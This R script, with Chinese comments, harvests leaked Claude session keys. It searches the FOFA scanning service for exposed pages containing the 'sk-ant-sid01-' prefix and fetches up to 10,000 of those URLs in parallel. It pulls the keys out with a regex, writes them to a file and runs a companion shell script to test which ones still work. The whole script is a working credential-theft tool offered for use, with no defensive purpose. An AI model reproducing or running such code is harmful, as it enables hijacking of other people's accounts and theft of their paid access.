# ----------------------------
# R脚本: fetch_claude_orgs.R
# ----------------------------
# 加载包
library(httr)
library(stringr)
library(jsonlite)
library(crayon)
library(future)
library(base64enc)
library(future.apply)

#-------------------------------------------------------
# Chapter 1: 使用fofa扫claude sessionkey - 获取URL列表
#-------------------------------------------------------

# 设置代理
proxy_url <- "http://127.0.0.1:7890"

# API请求URL
fofa_url <- "https://fofa.info/api/v1/search/all"

# 查询参数: 返回信息为link，返回条目数为10000（尽量多获取），full=T表示不限时间
params <- list(
  key = fofakey,
  qbase64 = base64encode(charToRaw('"sk-ant-sid01-"')), # 请求转化为base64编码
  fields = "link",
  size = 10000,
  full = "true"
)

# 发送GET请求
response <- GET(
  fofa_url,
  query = params,
  use_proxy(proxy_url, port = 7890),
  config(ssl_verifypeer = FALSE)
)

# 检查请求是否成功
if (status_code(response) == 200) {
  # 解析JSON响应
  content_text <- content(response, "text", encoding = "UTF-8")
  data <- fromJSON(content_text)
  
  # 提取link向量
  urls <- data$results
  
  # 打印结果
  cat("成功获取到", length(urls), "个URL。\n")
} else {
  stop("请求失败，状态码：", status_code(response))
}

#-------------------------------------------------------
# Chapter 2: 并行访问URL并提取sessionKey
#-------------------------------------------------------

# 定义匹配key的正则表达式模式
# 匹配以"sk-ant-sid01-"开头，后跟字母、数字、下划线或短横线的字符串
pattern <- "sk-ant-sid01-[A-Za-z0-9_-]+"

#设置并行处理策略
# 这里选择基于多进程的并行策略（适用于类Unix系统和Windows）
# 对于Windows，建议使用 multiprocess，因为 multicore 不可用
# 对于类Unix系统，可以使用 multicore 或 multisession
plan(multisession, workers = availableCores() - 1)  # 保留一个核心给系统

cat("已设置并行策略，使用的核心数:", availableCores() - 1, "\n")

# 定义一个函数来访问单个URL并提取keys
fetch_keys_from_url <- function(url) {
  local_keys <- c()
  message("访问 URL: ", url)
  
  # 发送GET请求
  response <- try(GET(url), silent = TRUE)
  
  # 检查请求是否成功
  if (inherits(response, "try-error")) {
    warning("无法访问 ", url)
    return(local_keys)
  }
  
  if (status_code(response) == 200) {
    # 获取内容为文本
    content_text <- content(response, "text", encoding = "UTF-8")
    
    # 使用正则表达式提取所有匹配的keys
    matched_keys <- str_extract_all(content_text, pattern)[[1]]
    
    if (length(matched_keys) > 0) {
      message("在 ", url, " 中找到 ", length(matched_keys), " 个key。")
      local_keys <- matched_keys
    } else {
      message("在 ", url, " 中未找到匹配的key。")
    }
  } else {
    warning("访问 ", url, " 时收到状态码: ", status_code(response))
  }
  
  return(local_keys)
}

# 并行处理所有URL以提取keys
# 使用 future_lapply 进行并行遍历
all_keys <- future_lapply(urls, fetch_keys_from_url)

# 关闭并行计划（可选，因为 R 会在脚本结束时自动停止）
plan(sequential)

# 合并所有提取到的keys，并去除重复
flatten_keys <- unlist(all_keys)
unique_keys <- unique(flatten_keys)

# 检查是否找到任何keys
if (length(unique_keys) == 0) {
  warning("未找到任何匹配的keys。")
} else {
  # 将keys写入claude-sessionkey.txt文件中
  writeLines(unique_keys, "claude-sessionkey.txt")
  message("已将 ", length(unique_keys), " 个key保存到 claude-sessionkey.txt。")
}

#-------------------------------------------------------
# Chapter:验证key是否可用--shell脚本
#-------------------------------------------------------

# 执行Shell脚本并将输出保存到claude-sessionkey_alive.txt中
shell_script <- "fetch_claude_orgs.sh"

# 检查Shell脚本是否存在
if (file.exists(shell_script)) {
  message("正在执行Shell脚本: ", shell_script)
  
  # 构建执行命令
  # 对于类Unix系统，使用 "bash" 执行
  # 对于Windows，可能需要调整，如使用 "cmd /c" 或已安装的bash环境
  if (.Platform$OS.type == "windows") {
    # 假设已安装Git Bash或其他bash环境
    command <- paste("bash", shQuote(shell_script), ">", shQuote("claude-sessionkey_alive.txt"))
  } else {
    # 类Unix系统
    command <- paste("bash", shQuote(shell_script), ">", shQuote("claude-sessionkey_alive.txt"))
  }
  
  # 运行命令
  system_status <- system(command, intern = FALSE, ignore.stderr = FALSE)
  
  if (system_status == 0) {
    message("Shell脚本执行成功，输出已保存到 claude-sessionkey_alive.txt。")
  } else {
    warning("Shell脚本执行时出错。")
  }
} else {
  stop("未找到Shell脚本: ", shell_script)
}

# ----------------------------
# 脚本结束
# ----------------------------
